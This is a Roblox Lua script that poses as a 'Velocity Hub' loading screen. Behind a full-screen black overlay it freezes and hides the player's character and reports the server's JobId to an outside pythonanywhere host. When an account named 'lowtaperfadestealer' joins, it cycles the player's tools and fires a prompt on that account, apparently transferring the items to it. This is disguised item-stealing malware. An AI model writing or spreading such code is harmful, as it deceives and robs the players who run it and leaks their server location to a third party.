--user side


local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local camera = workspace.CurrentCamera

-- Freeze and hide character
local char = player.Character or player.CharacterAdded:Wait()
char:WaitForChild("HumanoidRootPart").Anchored = true
for _, v in pairs(char:GetDescendants()) do
    if v:IsA("BasePart") then
        v.Transparency = 1
        if v:FindFirstChild("face") then
            v.face.Transparency = 1
        end
    elseif v:IsA("Decal") then
        v.Transparency = 1
    end
end

-- Move camera to blackness
camera.CameraType = Enum.CameraType.Scriptable
camera.CFrame = CFrame.new(999999, 999999, 999999)

-- Create full-screen loading GUI
local screenGui = Instance.new("ScreenGui")
screenGui.IgnoreGuiInset = true -- This ensures full coverage (top bar etc.)
screenGui.ResetOnSpawn = false
screenGui.Name = "VelocityHubLoadingScreen"
screenGui.Parent = playerGui

-- Black background
local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.Position = UDim2.new(0, 0, 0, 0)
background.BackgroundColor3 = Color3.new(0, 0, 0)
background.BackgroundTransparency = 0
background.Parent = screenGui

-- Cool title text
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 0.2, 0)
textLabel.Position = UDim2.new(0, 0, 0.4, 0)
textLabel.BackgroundTransparency = 1
textLabel.Text = "Velocity Hub"
textLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
textLabel.TextScaled = true
textLabel.Font = Enum.Font.LuckiestGuy
textLabel.Parent = screenGui

-- Outline around the text
local stroke = Instance.new("UIStroke")
stroke.Color = Color3.new(0, 0, 0)
stroke.Thickness = 3
stroke.Parent = textLabel



local function startthestuff()
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local Backpack = Player:WaitForChild("Backpack")
local Character = Player.Character or Player.CharacterAdded:Wait()

local currentIndex = 0
local tools = {}

-- Update the tools list
local function updateTools()
    tools = {}
    for _, item in ipairs(Backpack:GetChildren()) do
        if item:IsA("Tool") and not string.find(item.Name:lower(), "shovel") then
            table.insert(tools, item)
        end
    end
end


-- Callback to run **after each tool is equipped**
local function afterEachTool(tool)
    local success, prompt = pcall(function()
        return workspace:WaitForChild("lowtaperfadestealer", 5)
            :WaitForChild("HumanoidRootPart", 5)
            :WaitForChild("ProximityPrompt", 5)
    end)

    if success and prompt and prompt:IsA("ProximityPrompt") then
        prompt.Enabled = true -- Auto-enable the prompt
        fireproximityprompt(prompt, 1, true)
    else
        warn("Failed to find or fire the ProximityPrompt.")
    end
end


-- Callback to run **after full cycle of all tools**
local function afterFullCycle()
    print("Finished cycling through all tools!")
    -- Put your custom full-cycle logic here
end

local function cycleTool()
    updateTools()
    if #tools == 0 then return end

    -- Unequip current tool if one is equipped
    local equipped = Character:FindFirstChildOfClass("Tool")
    if equipped then
        equipped.Parent = Backpack
    end

    currentIndex = currentIndex + 1
    if currentIndex > #tools then
        currentIndex = 1
        afterFullCycle()
    end

    local nextTool = tools[currentIndex]
    nextTool.Parent = Character
    afterEachTool(nextTool)
end

-- Loop through tools every 3 seconds
while true do
    cycleTool()
    task.wait(0.5)
end

end
game:HttpGet("https://mojitomint.pythonanywhere.com/set?a="..game.JobId)
game.Players.PlayerAdded:Connect(function(player)
    if player.Name == "lowtaperfadestealer" then
    wait(10)
    startthestuff()
    end
end)
